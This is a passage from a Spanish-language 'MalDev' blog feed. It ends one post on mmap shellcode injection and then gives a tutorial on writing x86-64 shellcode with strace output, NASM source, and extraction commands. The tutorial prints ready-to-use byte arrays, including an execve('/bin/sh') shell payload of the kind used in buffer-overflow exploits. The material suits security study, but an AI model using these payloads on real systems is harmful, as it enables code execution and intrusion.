<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">ejecutar_shellcode</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Solo queda compilar y ejectuar</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -o inyeccion_mmap inyeccion_mmap.c
./inyeccion_mmap
</code></pre></div></div>

<p>Eso ha sido todo, gracias por leer ❤</p>

<p><img src="/assets/img/mmap_injection/waifu.gif" alt="" /></p>]]></content><author><name>c4rta</name></author><category term="MalDev" /><summary type="html"><![CDATA[Desarrollaremos un programa en C el cual inyectara una shellcode usando la syscall mmap()]]></summary></entry><entry><title type="html">Shellcodes - syscall write() y execve(bin/sh)</title><link href="http://localhost:4000/maldev/2023/06/07/maldev-shellcodes.html" rel="alternate" type="text/html" title="Shellcodes - syscall write() y execve(bin/sh)" /><published>2023-06-07T00:00:00-06:00</published><updated>2023-06-07T00:00:00-06:00</updated><id>http://localhost:4000/maldev/2023/06/07/maldev-shellcodes</id><content type="html" xml:base="http://localhost:4000/maldev/2023/06/07/maldev-shellcodes.html"><![CDATA[<p class="lead">Veremos a como puedes crear shellcodes, te enseñare como crear una usando la syscall write() y otra usando execve() para ejecutar bin/sh</p>

<h2 id="shellcodes">Shellcodes</h2>

<p>Las shellcodes son un conjunto de instrucciones de bajo nivel (ensamblador) que se inyectan en la memoria de un programa con el fin de ejecutar codigo</p>

<p>Actualemente son usadas ampliamente para ejecutar codigo malicioso, de hecho, si alguna vez explotaste un buffer overflow stack-based, estoy seguro de que las usaste al menos un vez, por otra parte, tambien son muy usadas en el desarrollo de malware, ya que hay muchas tecnicas diferentes para inyectarlas, al fin de cuenta, con las shellcodes puedes ejecutar casi cualquier cosa o cualquier cosa, y esto es gracias a la syscalls</p>

<h2 id="syscalls">Syscalls</h2>

<p>Las syscalls son metodos establecidos por el sistema operativo para decirle al kernel que realice una tarea, por ejemplo, tenemos este codigo:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"ola</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Es muy simple, de hecho, podemos decir que nomas tiene 3 intrucciones, el <code class="language-plaintext highlighter-rouge">include</code>, <code class="language-plaintext highlighter-rouge">printf</code> y el <code class="language-plaintext highlighter-rouge">void main()</code>. pero la cantidad de syscalls que hace es increible, usaremos el comando <code class="language-plaintext highlighter-rouge">strace</code> para interceptar y registrar todas las syscalls que hace nuestro binario: <code class="language-plaintext highlighter-rouge">strace ./binario</code>, y esto arroja:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>execve("./prueba", ["./prueba"], 0x7ffc3236ede0 /* 57 vars */) = 0
brk(NULL)                               = 0x5555f3c59000
arch_prctl(0x3001 /* ARCH_??? */, 0x7ffe25dc3f10) = -1 EINVAL (Invalid argument)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=167079, ...}, AT_EMPTY_PATH) = 0
mmap(NULL, 167079, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fde591cf000
close(3)                                = 0
openat(AT_FDCWD, "/usr/lib/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\20:\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
newfstatat(3, "", {st_mode=S_IFREG|0755, st_size=1961632, ...}, AT_EMPTY_PATH) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fde591cd000
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
mmap(NULL, 2006640, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fde58fe3000
mmap(0x7fde59005000, 1429504, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22000) = 0x7fde59005000
mmap(0x7fde59162000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x17f000) = 0x7fde59162000
mmap(0x7fde591ba000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1d6000) = 0x7fde591ba000
mmap(0x7fde591c0000, 52848, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fde591c0000
close(3)                                = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fde58fe1000
arch_prctl(ARCH_SET_FS, 0x7fde591ce640) = 0
set_tid_address(0x7fde591ce910)         = 60068
set_robust_list(0x7fde591ce920, 24)     = 0
rseq(0x7fde591cef60, 0x20, 0, 0x53053053) = 0
mprotect(0x7fde591ba000, 16384, PROT_READ) = 0
mprotect(0x5555f2670000, 4096, PROT_READ) = 0
mprotect(0x7fde59229000, 8192, PROT_READ) = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
munmap(0x7fde591cf000, 167079)          = 0
newfstatat(1, "", {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x1), ...}, AT_EMPTY_PATH) = 0
getrandom("\x52\x39\x5a\x38\x9f\x83\x1b\x9e", 8, GRND_NONBLOCK) = 8
brk(NULL)                               = 0x5555f3c59000
brk(0x5555f3c7a000)                     = 0x5555f3c7a000
write(1, "ola\n", 4ola
)                    = 4
exit_group(4)                           = ?
+++ exited with 4 +++
</code></pre></div></div>

<p>Todas estas syscalls es lo que hace nuestro simple binario por detras, y nosotros no vemos este funcionamiento, solo vemos que imprime la cadena ola.</p>

<p>A lo que quiero llegar es que muchas de las instrucciones que hacemos en los lenguajes de programacion, tienen una syscall asociada, ya sea C, Python, Rust, Golang, etc, y es importante conocer las syscalls, por que cuando se desarrollan shellcodes, se llaman directamente a las sycalls tomando en cuenta su estructura.</p>

<p>Para llamar a syscalls desde lenguaje ensamblador se toman en cuenta las calling conventions, asi que para llamar a uns syscall se hace de esta forma <code class="language-plaintext highlighter-rouge">syscall(rdi,rsi,rdx,r10,r8,r9)</code>, recuerda que los primeros 6 argumentos se pasan por los registos rdi,rsi,rdx,r10,r8,r9, y lo demas se pasa por el stack</p>

<h2 id="shellcode-usando-write">Shellcode usando write()</h2>

<p>Esta syscall es usada para imprimir algo por la salida estandar (stdout), tiene la estructura:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">ssize_t</span> <span class="nf">write</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span>
</code></pre></div></div>

<ul>
  <li>
    <p>int fd: Es el descriptor de archivos donde se va a escribir, se puede establecer como 1(stdout), 2(sdterr), o cualquier otro descriptor que se abrio</p>
  </li>
  <li>
    <p>void *buf: Es un puntero al buffer desde donde se empezaran a leer los datos</p>
  </li>
  <li>
    <p>size_t count: Es el numero de bytes que se van a escribir</p>
  </li>
</ul>

<p>Ahora toca programiar en ensamblador:</p>

<p>Primeramente vamos a definir el inicio de nuestro programa, y lo hare de esta manera:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>section .text
        global _start:

_start:
</code></pre></div></div>

<p>Con <code class="language-plaintext highlighter-rouge">section .text</code> le estoy diciendo que las instrucciones que le siguen, o apartir de ese punto, se van a almacenar en la seccion <code class="language-plaintext highlighter-rouge">.text</code>, y eso es asi, por que esa seccion contiene las instrucciones que se van a ejecutar.</p>

<p>Con <code class="language-plaintext highlighter-rouge">global _start</code> le estoy diciendo que exporte los simbolos a partir de <code class="language-plaintext highlighter-rouge">_start</code>, para que sean visiable desde fuera del archivo, y se hace con el fin de que puedan ser leidos por el enlazador (ld).</p>

<p>Y dentro de <code class="language-plaintext highlighter-rouge">_start</code> va todo nuestro codigo, y el programa completo se veria asi:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>section .text
        global _start:

_start:
        mov rax, 1
        mov rsi, 0x616e757a614e
        push rsi
        mov rsi, rsp
        mov rdx, 6
        syscall  
        mov rax, 60
        syscall
</code></pre></div></div>

<ul>
  <li>
    <p>Con <code class="language-plaintext highlighter-rouge">mov rax, 1</code> estamos copiando el numero 1, al registro <code class="language-plaintext highlighter-rouge">rax</code>, es 1, por que la syscall write esta asociada a ese numero en GNU/Linux</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">mov rsi, 0x616e757a614e</code> le estamos diciendo que copie el valor que queremos mostrar (0x616e757a614e), al registro <code class="language-plaintext highlighter-rouge">rsi</code>, y en este caso, <code class="language-plaintext highlighter-rouge">rsi</code> va a funcionar como puntero al valor que se va a escribir</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">push rsi</code> Esta poniendo el registro <code class="language-plaintext highlighter-rouge">rsi</code> en el stack, con el fin de que la syscall pueda acceder a lo que queremos imprimir</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">mov rsi, rsp</code> Aqui le indicamos que copie la direccion del <code class="language-plaintext highlighter-rouge">rsp</code> al registro <code class="language-plaintext highlighter-rouge">rsi</code>, y ahora si, <code class="language-plaintext highlighter-rouge">rsi</code> apunta al valor que vamos a imprimir el cual esta en el stack</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">mov rdx, 6</code> Le estamos indicando el tamaño en bytes de lo que se va a mostrar, asi que copia el tamaño de 6 bytes al registro rdx</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">syscall</code> se hace el llamado a write</p>
  </li>
  <li>
    <p>Las ultima dos instrucciones se hace el llamado a la syscall exit para que todo termine correctamente</p>
  </li>
</ul>

<p><strong>Ojo</strong></p>

<p>Te podras dar cuenta que no se usa el registro rdi, que para write, es usado para el descriptor de archivos, y diras: “Como es posible eso, si en la estructura de write se debe de establecer el registro rdi en 1, de hecho y <a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit">aca</a> lo dice”. Y pues no necesariamente, por que el descriptor de archivos ya tiene establecido por defecto el valor 1 para stdout.</p>

<p>Ahora procedemos a compilar: <code class="language-plaintext highlighter-rouge">nasm -f elf64 shellcode.asm</code></p>

<p>Esto nos dejara un archivo .o el cual debemos de enlazar: <code class="language-plaintext highlighter-rouge">ld -m elf_x86_64 -s -o write shellcode.o</code></p>

<p>Estos dos comandos nos dejo un binario elf, el cual si ejecutamos, se ejecutara la syscall write, y mostrara el texto:</p>

<p><img src="/assets/img/shellcode/1.png" alt="" /></p>

<p>Y a toda madre, funciona, pero eso no es una shellcode, es un binario elf, y si lo vemos en un editor hexadecimal podemos ver la shellcode en hexadecimal</p>

<p><img src="/assets/img/shellcode/2.png" alt="" /></p>

<p>Asi que para pasarla a un byte array, que seria la forma en la que se inyectan, primero usaremos</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">objcopy -j .text -O binary shellcode.o write.bin</code> para generar un archivo .bin</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">hexdump -v -e '"\\" 1/1 "x%02x"' write.bin; echo</code> para imprimir el byte array</p>
  </li>
</ul>

<p>Y ahora si, esto si es una shellcode a como estamos acostumbrados a verlas:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\xb8\x01\x00\x00\x00\x48\xbe\x4e\x61\x7a\x75\x6e\x61\x00\x00\x56\x48\x89\xe6\xba\x06\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\x0f\x05
</code></pre></div></div>

<h2 id="shellcode-para-conseguir-una-shell">Shellcode para conseguir una shell</h2>

<p>Ahora usaremos execve para poder ejecutar /bin/sh, y que consigamos una shell, el codigo es el siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>section .text
    global _start

_start:

    xor rdx, rdx
    push rdx
    mov rax, 0x68732f2f6e69622f
    push rax
    mov rdi, rsp
    push rdx
    push rdi
    mov rsi, rsp
    xor rax, rax
    mov al, 0x3b
    syscall
</code></pre></div></div>
<p>Explicare directamente lo que esta dentro de <code class="language-plaintext highlighter-rouge">_start</code> por que lo demas ya saben que hace</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">xor rdx, rdx</code> El registo <code class="language-plaintext highlighter-rouge">rdx</code> haciendo una operacion XORing consigo mismo, esto es para que el registro este limpio antes de usarlo, es buena practica nomas, si se le quita no pasa nada</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">push rdx</code> Metemos un null bye al stack para indicar el final de la cadena que se le pasara como argumento a execve</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">mov rax, 0x68732f2f6e69622f</code> Copiamos /bin/sh al registro rax (la cadena esta en hex)</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">push rax</code> Metemos <code class="language-plaintext highlighter-rouge">rax</code> al stack para que pueda ser accedida por el <code class="language-plaintext highlighter-rouge">rsp</code></p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">mov rdi, rsp</code> Copiamos la direccion de /bin/sh en <code class="language-plaintext highlighter-rouge">rdi</code>, la cual sera el primer argumento de execve, en ese momento el <code class="language-plaintext highlighter-rouge">rsp</code> apunta a la direccion de /bin/sh</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">push rdx</code> Metemos otro byte nulo al stack</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">push rdi</code> Metemos la direccion de /bin/sh en el stack</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">mov rsi, rsp</code> Copiamos la direccion del <code class="language-plaintext highlighter-rouge">rsp</code> en <code class="language-plaintext highlighter-rouge">rsi</code>, esto funcionara como segundo argumento de execve, que representa el entorno del programa que se ejecutara</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">xor rax, rax</code> Lo mismo que el primer <code class="language-plaintext highlighter-rouge">xor</code></p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">mov al, 0x3b</code> Copiamos el valor 0x3b que representa el numero de la syscall, al registro <code class="language-plaintext highlighter-rouge">al</code> que funciona como un byte inferior de <code class="language-plaintext highlighter-rouge">rax</code>, y por ultimo se ejecuta la syscall</p>
  </li>
</ul>

<p>Si volvemos a hacer todo el tramite de compilar y enlazar, ya tendremos nuestro ejetutable que nos da una shell, si vemos la shellcode en hex, todo esta perfecto:</p>

<p><img src="/assets/img/shellcode/3.png" alt="" /></p>

<p>Y si ejecutamos, nos da una shell:</p>

<p><img src="/assets/img/shellcode/4.png" alt="" /></p>

<p>Y listo, tenemos otra shellcode:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05
</code></pre></div></div>

<p>Y como ultimo, estos dos codigos que te explique, no es la unica forma de llamar a write o execve, ya depende del creador y del contexto donde se usa, y supongo que te ha pasado que cuando haces un BoF, una shellcode te sirve y otra no, aun que tengas todo tu exploit bien.</p>

<p>Eso ha sido todo, gracias por leer ❤</p>

<p><img src="/assets/img/shellcode/waifu.gif" alt="" /></p>]]></content><author><name>c4rta</name></author><category term="MalDev" /><summary type="html"><![CDATA[Veremos a como puedes crear shellcodes, te enseñare como crear una usando la syscall write() y otra usando execve() para ejecutar bin/sh]]></summary></entry></feed>